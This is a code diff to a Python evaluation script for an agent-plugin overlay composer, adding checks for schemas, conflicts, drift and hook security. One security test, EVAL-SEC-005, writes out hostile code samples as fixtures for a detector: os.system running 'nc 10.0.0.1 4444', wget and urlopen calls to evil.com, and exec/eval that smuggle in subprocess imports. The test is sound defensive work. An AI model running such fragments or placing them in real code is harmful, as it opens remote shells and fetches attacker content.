@@ -13,13 +13,25 @@ Exit codes:
     1 - One or more evals fail
 """
 
+import ast
 import difflib
 import json
+import os
 import re
+import shutil
+import subprocess
 import sys
+import tempfile
 import time
 from pathlib import Path
 from typing import List, Optional, Tuple
+
+# Make plugin/scripts importable so we can reuse hook_security checks.
+_PLUGIN_SCRIPTS = str(Path(__file__).resolve().parent.parent / "plugin" / "scripts")
+if _PLUGIN_SCRIPTS not in sys.path:
+    sys.path.insert(0, _PLUGIN_SCRIPTS)
+
+from hook_security import check_no_external_deps, check_no_network_calls
 
 # ---------------------------------------------------------------------------
 # Configuration
@@ -80,6 +92,8 @@ def grep_dir(rel_dir: str, pattern: str, file_suffix: str = "") -> List[Tuple[st
         return results
     for fpath in sorted(full.rglob("*")):
         if not fpath.is_file():
+            continue
+        if "__pycache__" in fpath.parts:
             continue
         if file_suffix and not fpath.name.endswith(file_suffix):
             continue
@@ -705,30 +719,11 @@ def eval_doc_002():
 
 def eval_sec_001():
     """EVAL-SEC-001: No non-stdlib imports in hook scripts"""
-    stdlib_modules = {
-        "sys", "os", "re", "json", "shutil", "subprocess", "argparse",
-        "typing", "__future__", "_hook_utils", "pathlib", "importlib",
-        "importlib.util", "textwrap", "collections", "functools",
-        "io", "string", "hashlib", "time", "datetime", "copy",
-        "traceback", "contextlib", "abc", "enum", "dataclasses",
-        "shlex", "glob", "fnmatch", "signal", "struct", "tempfile",
-        "unittest", "logging", "inspect", "ast", "token", "tokenize",
-    }
     errors = []
     hook_dir = REPO_ROOT / PLUGIN_DIR / "hooks"
     if hook_dir.is_dir():
         for fpath in sorted(hook_dir.glob("*.py")):
-            lines = fpath.read_text(encoding="utf-8").splitlines()
-            for i, line in enumerate(lines, 1):
-                stripped = line.strip()
-                if stripped.startswith("import ") or stripped.startswith("from "):
-                    # Parse the module name
-                    if stripped.startswith("from "):
-                        module = stripped.split()[1].split(".")[0]
-                    else:
-                        module = stripped.split()[1].split(".")[0].rstrip(",")
-                    if module not in stdlib_modules:
-                        errors.append(f"{fpath.name}:{i}: non-stdlib import: {stripped}")
+            errors.extend(check_no_external_deps(str(fpath)))
     record(
         "EVAL-SEC-001",
         "No non-stdlib imports in hook scripts",
@@ -739,22 +734,16 @@ def eval_sec_001():
 
 def eval_sec_002():
     """EVAL-SEC-002: No network calls in hook scripts"""
-    network_patterns = [
-        r"\brequests\.",
-        r"\burllib\.",
-        r"\bhttp\.client",
-        r"\bhttp\.server",
-        r"\bsocket\.",
-        r"\bhttpx\.",
-        r"\baiohttp\.",
-    ]
-    combined = "|".join(network_patterns)
-    hits = grep_dir(f"{PLUGIN_DIR}/hooks", combined, file_suffix=".py")
+    errors = []
+    hook_dir = REPO_ROOT / PLUGIN_DIR / "hooks"
+    if hook_dir.is_dir():
+        for fpath in sorted(hook_dir.glob("*.py")):
+            errors.extend(check_no_network_calls(str(fpath)))
     record(
         "EVAL-SEC-002",
         "No network calls in hook scripts",
-        len(hits) == 0,
-        f"Found network call patterns: {hits[:3]}" if hits else "",
+        len(errors) == 0,
+        f"Found network call patterns: {errors[:3]}" if errors else "",
     )
 
 
@@ -802,6 +791,108 @@ def eval_sec_004():
     record(
         "EVAL-SEC-004",
         "All allowlist .regex files contain valid regex",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_sec_005():
+    """EVAL-SEC-005: Overlay hook security catches process execution and dynamic imports"""
+    from hook_security import check_no_banned_overlay_modules
+    errors = []
+
+    test_cases = [
+        # os.system / os.popen
+        ("os_system.py", 'import os\nos.system("curl https://example.com")\n'),
+        ("os_popen.py", 'import os\nos.popen("wget http://evil.com")\n'),
+        ("os_aliased.py", 'import os as o\no.system("nc 10.0.0.1 4444")\n'),
+        ("from_os_system.py", 'from os import system\nsystem("curl https://example.com")\n'),
+        # __import__
+        ("dunder_import_subprocess.py", '__import__("subprocess").run(["curl", "..."])\n'),
+        ("dunder_import_urllib.py",
+         '__import__("urllib.request", fromlist=["urlopen"]).urlopen("http://evil.com")\n'),
+        # importlib.import_module
+        ("importlib_import.py", 'import importlib\nimportlib.import_module("subprocess")\n'),
+        ("importlib_aliased.py", 'import importlib as il\nil.import_module("requests")\n'),
+        ("from_importlib.py", 'from importlib import import_module\nimport_module("subprocess")\n'),
+        # exec / eval
+        ("exec_import.py", "exec(\"import subprocess\")\n"),
+        ("eval_import.py", "eval(\"__import__('subprocess')\")\n"),
+    ]
+
+    for name, code in test_cases:
+        tmpdir = tempfile.mkdtemp(prefix="eval-sec-005-")
+        try:
+            hook_path = os.path.join(tmpdir, name)
+            with open(hook_path, "w") as f:
+                f.write(code)
+            violations = check_no_banned_overlay_modules(hook_path)
+            if not violations:
+                errors.append(f"{name}: expected violation but got none")
+        finally:
+            shutil.rmtree(tmpdir, ignore_errors=True)
+
+    # Negative: safe stdlib usage should not trigger.
+    safe_cases = [
+        ("safe_os.py", 'import os\nresult = os.path.join("/a", "b")\n'),
+        ("safe_json.py", 'import json\njson.dumps({"key": "val"})\n'),
+    ]
+    for name, code in safe_cases:
+        tmpdir = tempfile.mkdtemp(prefix="eval-sec-005-neg-")
+        try:
+            hook_path = os.path.join(tmpdir, name)
+            with open(hook_path, "w") as f:
+                f.write(code)
+            violations = check_no_banned_overlay_modules(hook_path)
+            if violations:
+                errors.append(f"{name}: safe code flagged: {violations}")
+        finally:
+            shutil.rmtree(tmpdir, ignore_errors=True)
+
+    record(
+        "EVAL-SEC-005",
+        "Overlay hook security catches process exec and dynamic imports",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_sec_006():
+    """EVAL-SEC-006: Rollback cleans up parent directories created by composition"""
+    errors = []
+    tmpdir = tempfile.mkdtemp(prefix="eval-sec-006-")
+    try:
+        from composer import _makedirs_tracked
+
+        nested = os.path.join(tmpdir, "a", "b", "c")
+        dirs_created: list = []
+        _makedirs_tracked(nested, dirs_created)
+
+        if not os.path.isdir(nested):
+            errors.append("_makedirs_tracked did not create directory")
+        if len(dirs_created) < 3:
+            errors.append(
+                f"expected 3 levels tracked, got {len(dirs_created)}: {dirs_created}"
+            )
+
+        # Simulate rollback: remove in recorded order (deepest first).
+        for d in dirs_created:
+            try:
+                os.rmdir(d)
+            except OSError:
+                pass
+
+        remaining = os.path.join(tmpdir, "a")
+        if os.path.isdir(remaining):
+            errors.append(
+                f"parent directory {remaining} survived rollback"
+            )
+    finally:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+
+    record(
+        "EVAL-SEC-006",
+        "Rollback cleans up parent directories",
         len(errors) == 0,
         "; ".join(errors) if errors else "",
     )
@@ -1014,6 +1105,1076 @@ def eval_maint_003():
 
 
 # ---------------------------------------------------------------------------
+# Overlay eval implementations
+# ---------------------------------------------------------------------------
+
+def eval_ovl_001():
+    """EVAL-OVL-001: overlay.schema.json exists, valid JSON, and covers all contribution types"""
+    path = f"{PLUGIN_DIR}/schemas/overlay.schema.json"
+    errors = []
+    if not file_exists(path):
+        errors.append(f"{path} does not exist")
+    else:
+        content = read_file(path)
+        try:
+            schema = json.loads(content)
+        except json.JSONDecodeError as e:
+            errors.append(f"{path} is not valid JSON: {e}")
+            schema = None
+
+        if schema:
+            # Check required top-level fields are documented.
+            req = schema.get("required", [])
+            for field in ("name", "version", "description", "schema_version", "contributions"):
+                if field not in req:
+                    errors.append(f"schema missing {field!r} in required list")
+
+            # Check all 7 contribution type keys are present.
+            contribs_props = (
+                schema.get("properties", {})
+                .get("contributions", {})
+                .get("properties", {})
+            )
+            expected_types = {
+                "orchestrator", "delegation", "agents", "spec",
+                "auxiliary_agents", "mcp_servers", "permissions",
+            }
+            for ct in sorted(expected_types):
+                if ct not in contribs_props:
+                    errors.append(f"schema missing contribution type {ct!r}")
+
+            # Check _meta has valid_pipeline_agents.
+            meta = schema.get("_meta", {})
+            agents = meta.get("valid_pipeline_agents", [])
+            if len(agents) != 13:
+                errors.append(
+                    f"schema _meta.valid_pipeline_agents has {len(agents)} "
+                    f"agents, expected 13"
+                )
+
+    record(
+        "EVAL-OVL-001",
+        "overlay.schema.json exists, valid, covers all contribution types",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_002():
+    """EVAL-OVL-002: anchor-map.json has 13 agents, 22 anchors, all after_section headings exist in agent files"""
+    path = f"{PLUGIN_DIR}/schemas/anchor-map.json"
+    errors = []
+    if not file_exists(path):
+        errors.append(f"{path} does not exist")
+        record(
+            "EVAL-OVL-002",
+            "anchor-map.json integrity and sync validation",
+            False,
+            errors[0],
+        )
+        return
+
+    content = read_file(path)
+    try:
+        data = json.loads(content)
+    except json.JSONDecodeError as e:
+        record(
+            "EVAL-OVL-002",
+            "anchor-map.json integrity and sync validation",
+            False,
+            f"{path} is not valid JSON: {e}",
+        )
+        return
+
+    agents = data.get("agents", {})
+    agent_count = len(agents)
+    if agent_count != 13:
+        errors.append(f"expected 13 agents, got {agent_count}")
+
+    total_anchors = sum(len(a.get("anchors", {})) for a in agents.values())
+    if total_anchors != 22:
+        errors.append(f"expected 22 anchors total, got {total_anchors}")
+
+    # Sync validation: each anchor's after_section heading must exist in the
+    # corresponding agent .md file.
+    for agent_name, agent_info in agents.items():
+        agent_file = f"{PLUGIN_DIR}/agents/{agent_name}.md"
+        agent_content = read_file(agent_file)
+        if not agent_content:
+            errors.append(f"{agent_file} does not exist or is empty")
+            continue
+        for anchor_name, anchor_info in agent_info.get("anchors", {}).items():
+            after_section = anchor_info.get("after_section", "")
+            if after_section and after_section not in agent_content:
+                errors.append(
+                    f"{agent_name}.{anchor_name}: after_section "
+                    f"{after_section!r} not found in {agent_file}"
+                )
+
+    record(
+        "EVAL-OVL-002",
+        "anchor-map.json integrity and sync validation",
+        len(errors) == 0,
+        "; ".join(errors[:5]) if errors else "",
+    )
+
+
+def eval_ovl_003():
+    """EVAL-OVL-003: composer.py exists and is syntactically valid Python"""
+    path = f"{PLUGIN_DIR}/scripts/composer.py"
+    errors = []
+    if not file_exists(path):
+        errors.append(f"{path} does not exist")
+    else:
+        content = read_file(path)
+        try:
+            ast.parse(content, filename=path)
+        except SyntaxError as e:
+            errors.append(f"{path} has syntax error: {e}")
+    record(
+        "EVAL-OVL-003",
+        "composer.py exists and is syntactically valid Python",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_004():
+    """EVAL-OVL-004: Composition with test fixture succeeds in dry-run mode"""
+    fixture_path = str(FIXTURES_DIR / "test-overlay")
+    base_path = str(REPO_ROOT / PLUGIN_DIR)
+    errors = []
+
+    if not (FIXTURES_DIR / "test-overlay" / "system2.overlay.json").is_file():
+        errors.append("test fixture system2.overlay.json not found")
+        record(
+            "EVAL-OVL-004",
+            "Composition with test fixture succeeds (dry-run)",
+            False,
+            errors[0],
+        )
+        return
+
+    result = subprocess.run(
+        [
+            sys.executable,
+            str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
+            "--base", base_path,
+            "--overlays", fixture_path,
+            "--project", "/tmp/test-compose-eval",
+            "--dry-run",
+            "--format", "json",
+        ],
+        capture_output=True,
+        text=True,
+        timeout=30,
+        cwd=str(REPO_ROOT),
+    )
+
+    if result.returncode != 0:
+        stderr_snippet = result.stderr[:300] if result.stderr else ""
+        stdout_snippet = result.stdout[:300] if result.stdout else ""
+        errors.append(
+            f"composer.py dry-run exited with code {result.returncode}; "
+            f"stderr: {stderr_snippet}; stdout: {stdout_snippet}"
+        )
+    else:
+        # Verify output contains expected contribution types.
+        try:
+            output = json.loads(result.stdout)
+            report = output.get("report", {})
+            applied = report.get("contributions_applied", {})
+            expected_types = [
+                "orchestrator.principles",
+                "delegation.advisory_sources",
+            ]
+            for etype in expected_types:
+                if etype not in applied:
+                    errors.append(
+                        f"expected contribution type {etype!r} not in "
+                        f"contributions_applied: {list(applied.keys())}"
+                    )
+        except json.JSONDecodeError as e:
+            errors.append(f"composer.py dry-run output is not valid JSON: {e}")
+
+    record(
+        "EVAL-OVL-004",
+        "Composition with test fixture succeeds (dry-run)",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_005():
+    """EVAL-OVL-005: Composed CLAUDE.md preserves base content and includes overlay content"""
+    fixture_path = str(FIXTURES_DIR / "test-overlay")
+    base_path = str(REPO_ROOT / PLUGIN_DIR)
+    errors = []
+
+    if not (FIXTURES_DIR / "test-overlay" / "system2.overlay.json").is_file():
+        errors.append("test fixture system2.overlay.json not found")
+        record(
+            "EVAL-OVL-005",
+            "Composed CLAUDE.md preserves base + adds overlay content",
+            False,
+            errors[0],
+        )
+        return
+
+    tmpdir = tempfile.mkdtemp(prefix="eval-ovl-005-")
+    try:
+        pre_git_check = subprocess.run(
+            ["git", "diff", "--name-only", "--", "plugin/"],
+            capture_output=True,
+            text=True,
+            cwd=str(REPO_ROOT),
+        )
+        pre_plugin_diff = set(pre_git_check.stdout.splitlines())
+
+        result = subprocess.run(
+            [
+                sys.executable,
+                str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
+                "--base", base_path,
+                "--overlays", fixture_path,
+                "--project", tmpdir,
+                "--format", "json",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=30,
+            cwd=str(REPO_ROOT),
+        )
+
+        if result.returncode != 0:
+            stderr_snippet = result.stderr[:300] if result.stderr else ""
+            errors.append(
+                f"composer.py exited with code {result.returncode}; "
+                f"stderr: {stderr_snippet}"
+            )
+        else:
+            composed_path = os.path.join(tmpdir, "CLAUDE.md")
+            if not os.path.isfile(composed_path):
+                errors.append("composed CLAUDE.md was not written")
+            else:
+                with open(composed_path, "r", encoding="utf-8") as fh:
+                    composed = fh.read()
+
+                # Verify base content is preserved.
+                base_markers = [
+                    "System2 orchestrator",
+                    "Delegation map",
+                    "untrusted input",
+                ]
+                for marker in base_markers:
+                    if marker not in composed:
+                        errors.append(
+                            f"base content marker {marker!r} not found "
+                            f"in composed CLAUDE.md"
+                        )
+
+                # Verify overlay content is present.
+                overlay_markers = [
+                    "test-overlay",
+                    "validate inputs before processing",
+                ]
+                for marker in overlay_markers:
+                    if marker not in composed:
+                        errors.append(
+                            f"overlay content marker {marker!r} not found "
+                            f"in composed CLAUDE.md"
+                        )
+
+            # Verify base invariant evals still pass after composition.
+            pre_results_len = len(results)
+            base_invariant_evals = [
+                eval_inv_001, eval_inv_002,
+                eval_sec_001, eval_sec_002, eval_sec_003,
+            ]
+            for eval_fn in base_invariant_evals:
+                eval_fn()
+            post_results = results[pre_results_len:]
+            for r in post_results:
+                if not r.passed:
+                    errors.append(
+                        f"base invariant {r.eval_id} failed after composition: "
+                        f"{r.message}"
+                    )
+            # Remove these results — they were run as a sub-check, not standalone.
+            del results[pre_results_len:]
+
+            # Verify base System2 repo is unmodified by composition.
+            git_check = subprocess.run(
+                ["git", "diff", "--name-only", "--", "plugin/"],
+                capture_output=True,
+                text=True,
+                cwd=str(REPO_ROOT),
+            )
+            post_plugin_diff = set(git_check.stdout.splitlines())
+            new_plugin_diff = sorted(post_plugin_diff - pre_plugin_diff)
+            if git_check.returncode == 0 and new_plugin_diff:
+                errors.append(
+                    f"composition modified base plugin files: "
+                    f"{', '.join(new_plugin_diff)}"
+                )
+    finally:
+        shutil.rmtree(tmpdir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-005",
+        "Composed CLAUDE.md preserves base + adds overlay content",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_006():
+    """EVAL-OVL-006: Skipped unknown-anchor contributions do not block composition (REQ-OVL-051)"""
+    fixture_path = str(FIXTURES_DIR / "skipped-anchor-injection")
+    base_path = str(REPO_ROOT / PLUGIN_DIR)
+    errors = []
+
+    manifest_file = FIXTURES_DIR / "skipped-anchor-injection" / "system2.overlay.json"
+    if not manifest_file.is_file():
+        errors.append("skipped-anchor-injection fixture not found")
+        record("EVAL-OVL-006", "Skipped anchor with injection does not block compose", False, errors[0])
+        return
+
+    result = subprocess.run(
+        [
+            sys.executable,
+            str(REPO_ROOT / PLUGIN_DIR / "scripts" / "composer.py"),
+            "--base", base_path,
+            "--overlays", fixture_path,
+            "--project", "/tmp/test-compose-ovl006",
+            "--dry-run",
+            "--format", "json",
+        ],
+        capture_output=True,
+        text=True,
+        timeout=30,
+        cwd=str(REPO_ROOT),
+    )
+
+    if result.returncode != 0:
+        errors.append(
+            f"composer.py exited {result.returncode} (expected 0); "
+            f"skipped unknown-anchor injection content should not block composition; "
+            f"stderr: {result.stderr[:200]}"
+        )
+    else:
+        try:
+            output = json.loads(result.stdout)
+            report = output.get("report", {})
+            injection_warns = report.get("injection_warnings", [])
+            if injection_warns:
+                errors.append(
+                    f"injection_warnings should be empty for skipped contributions "
+                    f"but got: {injection_warns}"
+                )
+            validation_warns = report.get("validation_warnings", [])
+            has_anchor_warning = any("missing_anchor" in w or "unknown anchor" in w for w in validation_warns)
+            if not has_anchor_warning:
+                errors.append("expected a validation warning about the unknown anchor")
+        except (json.JSONDecodeError, KeyError) as exc:
+            errors.append(f"failed to parse composer output: {exc}")
+
+    record(
+        "EVAL-OVL-006",
+        "Skipped anchor with injection does not block compose (REQ-OVL-051)",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_007():
+    """EVAL-OVL-007: known_conflicts declarations produce structural conflicts"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {"known_conflicts": ["overlay-b"]},
+         "contributions": {}},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {"known_conflicts": []},
+         "contributions": {}},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    if not report.has_structural_conflicts:
+        errors.append("expected structural conflict from known_conflicts declaration")
+    else:
+        types = [c["type"] for c in report.structural_conflicts]
+        if "known_conflicts" not in types:
+            errors.append(f"expected 'known_conflicts' type, got {types}")
+
+    # Negative case: no known_conflicts should produce no structural conflicts.
+    clean = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {"known_conflicts": []},
+         "contributions": {}},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {"known_conflicts": []},
+         "contributions": {}},
+    ]
+    clean_report = detect_conflicts(clean, anchor_map)
+    if clean_report.has_structural_conflicts:
+        errors.append("clean manifests should not have structural conflicts")
+
+    record(
+        "EVAL-OVL-007",
+        "known_conflicts declarations produce structural conflicts",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_008():
+    """EVAL-OVL-008: Auxiliary agent name collisions across overlays are structural conflicts"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "auxiliary_agents": [
+                 {"name": "shared-scout", "role": "scout", "pipeline": False,
+                  "delegation_policy": "orchestrator_optional", "agent_file": "agents/scout.md"}
+             ]
+         }},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "auxiliary_agents": [
+                 {"name": "shared-scout", "role": "scout", "pipeline": False,
+                  "delegation_policy": "orchestrator_optional", "agent_file": "agents/scout.md"}
+             ]
+         }},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    if not report.has_structural_conflicts:
+        errors.append("expected structural conflict from auxiliary agent name collision")
+    else:
+        types = [c["type"] for c in report.structural_conflicts]
+        if "auxiliary_agent_collision" not in types:
+            errors.append(f"expected 'auxiliary_agent_collision' type, got {types}")
+
+    record(
+        "EVAL-OVL-008",
+        "Auxiliary agent name collisions are structural conflicts",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_009():
+    """EVAL-OVL-009: After-declaration cycles produce structural conflicts"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-a", "content_file": "a.md", "after": "principle-b"},
+                 ]
+             }
+         }},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-b", "content_file": "b.md", "after": "principle-a"},
+                 ]
+             }
+         }},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    if not report.has_structural_conflicts:
+        errors.append("expected structural conflict from after-declaration cycle")
+    else:
+        types = [c["type"] for c in report.structural_conflicts]
+        if "ordering_cycle" not in types:
+            errors.append(f"expected 'ordering_cycle' type, got {types}")
+
+    record(
+        "EVAL-OVL-009",
+        "After-declaration cycles produce structural conflicts",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_010():
+    """EVAL-OVL-010: Deterministic additive ordering across overlays"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    manifests = [
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-b", "content_file": "b.md", "after": None},
+                 ]
+             }
+         }},
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-a", "content_file": "a.md", "after": None},
+                 ]
+             }
+         }},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    if report.has_structural_conflicts:
+        errors.append(f"unexpected structural conflicts: {report.structural_conflicts}")
+
+    if not report.additive_overlaps:
+        errors.append("expected additive overlap for orchestrator.principles")
+    else:
+        overlap = report.additive_overlaps[0]
+        order = overlap.get("order", [])
+        ids = [entry.get("id") for _, entry in order]
+        if ids != ["principle-a", "principle-b"]:
+            errors.append(
+                f"expected lexicographic ordering [principle-a, principle-b], got {ids}"
+            )
+
+    # Verify determinism: same input reversed should yield same order.
+    reversed_manifests = list(reversed(manifests))
+    report2 = detect_conflicts(reversed_manifests, anchor_map)
+    if report2.additive_overlaps:
+        order2 = report2.additive_overlaps[0].get("order", [])
+        ids2 = [entry.get("id") for _, entry in order2]
+        if ids != ids2:
+            errors.append(
+                f"ordering not deterministic: {ids} vs {ids2}"
+            )
+
+    record(
+        "EVAL-OVL-010",
+        "Deterministic additive ordering across overlays",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_011():
+    """EVAL-OVL-011: Semantic tension warnings for high-leverage surfaces"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    # Two overlays contributing to orchestrator.principles (high-leverage surface).
+    manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-a", "content_file": "a.md", "after": None},
+                 ]
+             }
+         }},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "orchestrator": {
+                 "principles": [
+                     {"id": "principle-b", "content_file": "b.md", "after": None},
+                 ]
+             }
+         }},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    hl_tensions = [t for t in report.semantic_tensions if t["type"] == "high_leverage_surface"]
+    if not hl_tensions:
+        errors.append("expected high_leverage_surface semantic tension for orchestrator.principles")
+
+    # Two overlays contributing to a high-leverage anchor (safety_rules).
+    anchor_manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "agents": {
+                 "executor": {
+                     "prompt_sections": {
+                         "safety_rules": [
+                             {"id": "safety-a", "content_file": "a.md", "after": None},
+                         ]
+                     }
+                 }
+             }
+         }},
+        {"name": "overlay-b", "version": "1.0.0", "tags": [],
+         "compatibility": {},
+         "contributions": {
+             "agents": {
+                 "executor": {
+                     "prompt_sections": {
+                         "safety_rules": [
+                             {"id": "safety-b", "content_file": "b.md", "after": None},
+                         ]
+                     }
+                 }
+             }
+         }},
+    ]
+    report2 = detect_conflicts(anchor_manifests, anchor_map)
+    hl_tensions2 = [t for t in report2.semantic_tensions if t["type"] == "high_leverage_surface"]
+    if not hl_tensions2:
+        errors.append("expected high_leverage_surface semantic tension for executor.safety_rules")
+
+    record(
+        "EVAL-OVL-011",
+        "Semantic tension warnings for high-leverage surfaces",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_012():
+    """EVAL-OVL-012: Semantic tension warnings for shared review tags"""
+    from composer import detect_conflicts
+
+    anchor_map = json.loads(read_file(os.path.join(PLUGIN_DIR, "schemas", "anchor-map.json")))
+    errors = []
+
+    manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": ["compute"],
+         "compatibility": {"review_when_combined_with_tags": ["compute"]},
+         "contributions": {}},
+        {"name": "overlay-b", "version": "1.0.0", "tags": ["compute"],
+         "compatibility": {},
+         "contributions": {}},
+    ]
+    report = detect_conflicts(manifests, anchor_map)
+    tag_tensions = [t for t in report.semantic_tensions if t["type"] == "shared_review_tag"]
+    if not tag_tensions:
+        errors.append("expected shared_review_tag semantic tension")
+    else:
+        if tag_tensions[0].get("tag") != "compute":
+            errors.append(f"expected tag 'compute', got {tag_tensions[0].get('tag')}")
+
+    # Negative: non-matching tags should produce no tension.
+    clean_manifests = [
+        {"name": "overlay-a", "version": "1.0.0", "tags": ["compute"],
+         "compatibility": {"review_when_combined_with_tags": ["storage"]},
+         "contributions": {}},
+        {"name": "overlay-b", "version": "1.0.0", "tags": ["compute"],
+         "compatibility": {},
+         "contributions": {}},
+    ]
+    clean_report = detect_conflicts(clean_manifests, anchor_map)
+    clean_tag_tensions = [t for t in clean_report.semantic_tensions if t["type"] == "shared_review_tag"]
+    if clean_tag_tensions:
+        errors.append("non-matching review tags should not produce tension")
+
+    record(
+        "EVAL-OVL-012",
+        "Semantic tension warnings for shared review tags",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+# ---------------------------------------------------------------------------
+# Doctor / drift-check evals
+# ---------------------------------------------------------------------------
+
+def _compose_fixture_overlay(tmp_dir):
+    """Helper: compose the test-overlay fixture into a temp project dir.
+
+    Returns (project_path, overlay_path, lock_data).
+    """
+    from composer import compose, _write_outputs
+
+    project_path = os.path.join(tmp_dir, "project")
+    os.makedirs(os.path.join(project_path, "spec"), exist_ok=True)
+
+    plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+    overlay_path = str(FIXTURES_DIR / "test-overlay")
+
+    result = compose(plugin_root, [overlay_path], project_path, dry_run=False)
+    assert not result["errors"], f"Fixture composition failed: {result['errors']}"
+
+    _write_outputs(
+        project_path,
+        result["claude_md"],
+        result["lock"],
+        result["auxiliary_agents"],
+        pending_content_copies=result.get("pending_content_copies", []),
+        overlay_info_for_lock=result.get("overlay_info_for_lock", []),
+        valid_anchors_by_agent=result.get("valid_anchors_by_agent"),
+    )
+
+    lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+    with open(lock_path, "r", encoding="utf-8") as fh:
+        lock_data = json.load(fh)
+
+    return project_path, overlay_path, lock_data
+
+
+def eval_ovl_013():
+    """EVAL-OVL-013: drift_check returns 'current' for freshly composed project"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl013_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "current":
+            errors.append(f"expected status 'current', got {result['status']!r}")
+        if not result["claude_md_composed"]:
+            errors.append("expected claude_md_composed=True")
+        if not result["overlays"]:
+            errors.append("expected at least one overlay status")
+        elif not result["overlays"][0]["source_exists"]:
+            errors.append("expected source_exists=True")
+        elif not result["overlays"][0]["manifest_match"]:
+            errors.append("expected manifest_match=True")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-013",
+        "drift_check returns 'current' for freshly composed project",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
+def eval_ovl_014():
+    """EVAL-OVL-014: drift_check detects stale base version"""
+    from composer import drift_check
+
+    errors = []
+    tmp_dir = tempfile.mkdtemp(prefix="eval_ovl014_")
+    try:
+        project_path, overlay_path, lock_data = _compose_fixture_overlay(tmp_dir)
+        plugin_root = str(REPO_ROOT / PLUGIN_DIR)
+
+        # Mutate the lock to simulate a version mismatch.
+        lock_path = os.path.join(project_path, "spec", "overlay-manifest.lock")
+        lock_data["system2_version"] = "0.0.0-fake"
+        with open(lock_path, "w", encoding="utf-8") as fh:
+            json.dump(lock_data, fh, indent=2)
+
+        result = drift_check(plugin_root, project_path)
+        if result["status"] != "stale_base":
+            errors.append(f"expected status 'stale_base', got {result['status']!r}")
+        stale_msgs = [d for d in result["details"] if d["type"] == "stale_base"]
+        if not stale_msgs:
+            errors.append("expected a stale_base detail entry")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    record(
+        "EVAL-OVL-014",
+        "drift_check detects stale base version",
+        len(errors) == 0,
+        "; ".join(errors) if errors else "",
+    )
+
+
